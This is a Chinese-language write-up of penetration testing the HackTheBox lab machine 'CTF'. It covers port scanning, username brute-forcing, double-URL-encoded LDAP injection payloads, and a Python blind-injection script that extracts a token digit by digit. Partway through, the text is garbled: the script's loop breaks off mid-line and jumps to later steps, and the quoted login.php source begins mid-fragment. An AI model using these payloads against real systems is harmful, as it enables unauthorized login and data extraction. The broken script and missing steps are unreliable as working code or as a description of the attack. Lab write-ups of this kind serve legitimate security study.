# Compressed Token Format渗透笔记
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## CTF
本文为渗透hackthebox
CTF靶机过程，本题难度等级为Insane。本次渗透学到几个比较有趣的Linux技巧，关键知识点涉及用户名爆破，ldap盲注，Stoken
OTP生成，命令执行以及Wildcard提权。
## PORT SCAN
端口扫描发现ssh及web端口
    root@kali:~# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.122 --rate=1000
    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2019-07-29 01:04:07 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 1 hosts [131070 ports/host]
    Discovered open port 22/tcp on 10.10.10.122
    Discovered open port 80/tcp on 10.10.10.122
    root@kali:~/pentest# nmap -A -sV -sS -p22,80 10.10.10.122
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 21:09 EDT
    Nmap scan report for 10.10.10.122
    Host is up (0.24s latency).
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey:
    |   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
    |   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
    |_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
    80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
    |_http-title: CTF
## 用户名爆破
打开80端口，是一个php站，并且提示暴力爆破会ban IP
网站有一个登陆页面，使用用户名和OTP进行登陆，右键查看网页源码，看到一点注释提示，知道token的长度为81位数字。
对登陆页面简单测试，随便输入一个用户名，会提示用户名不存在
虽然主页提示，暴力爆破会ban
IP，但根据以往经验，不让你干什么，你就更加要干。尝试对用户名进行爆破（使用字典：seclist的multiplesources-users-fabian-fingerle.de.txt），发现如果用户名包含特殊符号，返回结果不提示`not found`。
这个字典可以爆出一个用户名：`ldapuser`，会提示`Cannot login`，加上用户名对特殊符号有识别，猜测存在ldap注入。
## ldap注入
猜测后台的代码为：`(&(username=value1)(password=value2))`，使用or注入的payload：`*))(|(uid=*`，拼接后就变成：
    (&(username=*))(|(uid=*)(password=value2))
直接发送不会生效，进行两次urlencode后，使用以下payload，可以成功返回`Cannot login`，证明存在ldap注入
    inputUsername=%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&inputOTP=1234
由于没有回显，只能进行盲注，第一步需要爆破存在什么参数，参数的fuzz字典参考：[ldap_attribute_dic](https://github.com/droope/ldap-brute/blob/master/wordlists/attribute_names)
使用`inputUsername=%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38§uid§%25%33%64%25%32%61&inputOTP=1234`进行参数fuzz
fuzz出以下参数为：
    mail            Email Address
    rfc822mailbox    Email Address
    name            Full Name
    pager            Pager
    sn                Last Name
    surname            Last Name
    uid                User ID
其中`paper`比较特殊，怀疑是token，对此进行盲注，手工注入太慢，写一个python脚本进行爆破，根据提示为81位数字，不用太长时间就能爆出来。
    #!/usr/bin/python3
    import requests
    def send_payload(payload):
        post_data = {"inputUsername":payload,"inputOTP":"1234"}
        req = requests.post("http://10.10.10.122/login.php",data=post_data)
        if "Cannot login" in req.text:
            return 1
    def foo():
        global token
        for i in '0123456789':
            payload = "%2A%29%29%28%7C%28pager%3D{}{}%2A".format(token,str(i)) # *))(|(pager={}{}*
            if send_payload(payload):
                token+=str(i)
    token = ""
    while len(token) =0`进行登陆绕过（其实用`*))(|(uid=*`也行）
通过命令执行，获取网址源码
获取 **login.php** 源码
    <~]/';
        if (!preg_match($regex, $username1)) {
            $username2 = urldecode($username1);
            if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){